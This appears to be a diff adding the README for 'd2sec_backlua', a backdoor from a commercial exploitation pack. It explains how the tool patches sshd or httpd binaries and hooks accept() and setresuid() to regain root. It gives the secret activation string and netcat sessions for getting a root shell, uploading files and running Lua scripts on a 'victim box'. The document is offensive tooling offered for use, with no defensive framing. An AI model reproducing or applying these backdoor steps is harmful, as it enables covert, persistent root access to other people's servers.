@@ -1,0 +1,69 @@
+D2 Exploitation Pack
+
+Copyright (c) 2007-2011 DSquare Security, LLC
+All rights reserved.
+
+License information
+---------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Description
+-------------
+
+d2sec_backlua is a backdoor to execute Lua scripts on victim box.
+d2sec_backlua (d2sec_infest actually) modifies sshd binary (or httpd or ...)
+and adds a sort of preload library to binary that hooks accept() and
+setresuid() to regain privileges.
+
+The httpd service is one of the easiest target, because the clients send
+the first string and not the server. 
+
+d2sec_backlua was tested on Linux with Lua 5.1.
+
+Use d2sec_backlua
+--------------------
+
+To activate backdoor, you must connect to backdoored box and to send to
+the string '4ed1479a7a48653b13d492f52ecbe5d6'. After, 3 simple commands
+are available :
+
+u to upload
+s to shell
+e to execlua
+
+Examples:
+
+1/ shell:
+
+$ nc -vn 0 22
+Connection to 0 22 port [tcp/*] succeeded!
+(UNKNOWN) [127.0.0.1] 22 (www) open
+4ed1479a7a48653b13d492f52ecbe5d6
+s
+id
+uid=0(root) gid=0(root) groups=33(www-data)
+
+2/ upload:
+
+(echo '4ed1479a7a48653b13d492f52ecbe5d6'; echo 'u'; echo '/tmp/dsquare.lua'; echo `cat /tmp/d2sec.lua`) | nc 127.0.0.1 80
+
+3/ execlua:
+
+$ cat /tmp/dsquare.lua
+print("Hello World!")
+$ (echo '4ed1479a7a48653b13d492f52ecbe5d6'; echo 'u'; echo '/tmp/dsquare.lua'; echo `cat /tmp/d2sec.lua`) | nc 0 22
+$ nc -vn 0 22
+Connection to 0 22 port [tcp/*] succeeded!
+4ed1479a7a48653b13d492f52ecbe5d6
+e
+/tmp/d2sec.lua
+Hello World!
+
+
+Install d2sec_backlua
+-----------------------
+
+See d2sec_backweb/README to install this backdoor.
